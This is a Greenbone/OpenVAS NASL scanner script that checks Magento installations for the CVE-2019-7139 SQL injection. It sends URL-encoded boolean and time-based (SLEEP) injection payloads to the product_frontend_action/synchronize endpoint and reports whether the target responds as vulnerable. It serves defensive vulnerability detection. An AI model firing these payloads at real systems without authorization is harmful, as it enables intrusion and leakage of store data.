# Copyright (C) 2019 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = 'cpe:/a:magentocommerce:magento';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.142271");
  script_version("2019-04-23T13:11:29+0000");
  script_tag(name:"last_modification", value:"2019-04-23 13:11:29 +0000 (Tue, 23 Apr 2019)");
  script_tag(name:"creation_date", value:"2019-04-23 12:18:32 +0000 (Tue, 23 Apr 2019)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2019-7139");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Magento SQL Injection Vulnerability (CVE-2019-7139)");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("sw_magento_detect.nasl");
  script_mandatory_keys("magento/installed");

  script_tag(name:"summary", value:"An unauthenticated user can execute arbitrary code through an SQL injection
  vulnerability, which causes sensitive data leakage.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"Update to version 2.3.1 or later.");

  script_xref(name:"URL", value:"https://www.ambionics.io/blog/magento-sqli");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

# Error based check
base = dir + '/catalog/product_frontend_action/synchronize?type_id=recently_products&ids%5B0%5D%5Badded_at%5D=&ids%5B0%5D%5Bproduct_id%5D%5Bfrom%5D=%3F&ids%5B0%5D%5Bproduct_id%5D%5Bto%5D=';
payload1 = '%29%29%29+OR+%28SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+333%3D333%29+--+-';
payload2 = '%29%29%29+OR+%28SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+333%3D334%29+--+-';


url = base + payload1;
req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

if (res !~ "^HTTP/1\.[01] 400")
  exit(99);

url = base + payload2;
req = http_get(port: port, item: url);
start = unixtime();
res = http_keepalive_send_recv(port: port, data: req);
stop = unixtime();

if (res =~ "^HTTP/1\.[01] 200") {
  report = 'It was possible to perform a blind SQL injection attack.';
  security_message(port: port, data: report);
  exit(0);
}

# Time based check
latency = stop - start;

foreach i (make_list(1, 3)) {
  payload = "%29%29%29+OR+%28SELECT%2AFROM+%28SELECT+SLEEP%28%28" + i + "%29%29%29a%29%3D1+--+-";
  url = base + payload;
  req = http_get(port: port, item: url);
  start = unixtime();
  res = http_keepalive_send_recv(port: port, data: req);
  stop = unixtime();

  if (stop - start < i || stop - start > (i+5+latency))
    exit(0);
  else
   temp += 1;
}

if (temp == 2) {
  report = 'It was possible to perform a time-based SQL injection attack.';
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
